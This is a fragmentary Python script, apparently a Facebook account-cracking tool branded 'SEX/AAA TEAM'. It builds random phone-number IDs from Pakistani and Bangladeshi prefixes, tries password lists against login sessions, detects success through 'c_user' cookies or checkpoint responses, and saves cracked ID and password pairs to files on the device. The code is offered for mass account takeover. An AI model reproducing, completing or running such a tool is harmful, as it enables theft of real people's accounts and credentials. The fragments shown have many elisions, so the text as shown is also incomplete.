...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> SEX/AAA TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AAA:
				print('\r\r\033[1;31m[AAA-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/AAA-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AAA:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[AAA-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/AAA-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[AAA / SEX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in AAA:
				...
				print('\r\r\033[1;32m[AAA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[AAA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def menu():
	os.system('clear')
	print(logo)
	print('[A] Crack random Clone Method(Fast) 1')
	print('[B] Crack random Clone Method(Bast) 2')
	print('[C] Crack random Clone Method(Bast) 3')
	linex()
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318(bast),92345,92323,92306.ETC')
	linex()
...
def random_number3():
	...
	print('[√] EXAMPLE :92318(bast),92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE(bast-92345) : ')
	os.system('clear')
	print(logo)
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE : 88017***,88019***,88016****,88018****,.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mAAA / SEX\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[AAA-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[AAA-OK] '+cid+' | '+ps+'\33[0;97m')
